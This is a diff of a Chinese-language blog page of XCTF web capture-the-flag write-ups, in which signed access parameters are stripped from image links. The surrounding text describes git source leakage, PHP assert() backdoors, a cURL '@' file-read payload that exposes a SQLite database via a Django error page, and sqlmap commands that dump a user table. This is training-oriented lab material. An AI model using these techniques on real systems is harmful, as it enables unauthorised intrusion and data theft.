@@ -2776,9 +2774,9 @@
 
 <h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>打开About页面，发现提示，git，尝试git泄露，githack下载源码，放到Seay中</p>
 <p>目录结构</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_1.PNG?Expires=1562562785&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=FuaxMQWQpIhkTPdRNMkQ%2B1vfUBU%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_1.PNG" alt></p>
 <p>可能存在的漏洞</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_2.PNG?Expires=1562562794&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=6dVZ2%2B2NKsV8ezRvlxzsJUtc4hc%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_2.PNG" alt></p>
 <p>在index.php页面发现危险函数<strong>assert()</strong>，eval与assert都算是元老级一句话后门函数</p>
 <p>eval函数中参数是字符，如：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure>
@@ -2827,10 +2825,10 @@
 <p>3、%80，返回Django报错</p>
 <p>将报错信息保存为html，打开即为django报错页面</p>
 <p>发现数据库路径</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_1.png?Expires=1562562828&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=olpb%2BDbqTxMRvl%2BsltV%2BZViV8Bs%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_1.png" alt></p>
 <p>pyload：@/opt/api/database.sqlite3</p>
 <p>保存为html文件，发现flag</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_2.png?Expires=1562562836&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=3mQM5Yrjw%2BblumtK2j57JhT470o%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_2.png" alt></p>
 <p>总结：</p>
 <p>当  <strong>CURLOPT_SAFE_UPLOAD</strong> 为 true 时，PHP 可以通过在参数中注入 <strong>@</strong> 来读取文件。</p>
 <p>当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。  </p>
@@ -2840,7 +2838,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span></span><br><span class="line"></span><br><span class="line"> python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> -D cetc004 -T user --dump</span><br></pre></td></tr></table></figure>
 
 <p>得到用户信息</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_ics4_1.png?Expires=1562562851&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=gYeP56o7CH62smwGWFY%2F4gng4Lc%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_ics4_1.png" alt></p>
 <p>这里又一个逻辑漏洞，可以覆盖已注册的用户，重新注册一下用户即可</p>
 <h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>index.php?page=index</p>
 <p>观察URL，明显是个文件包含</p>
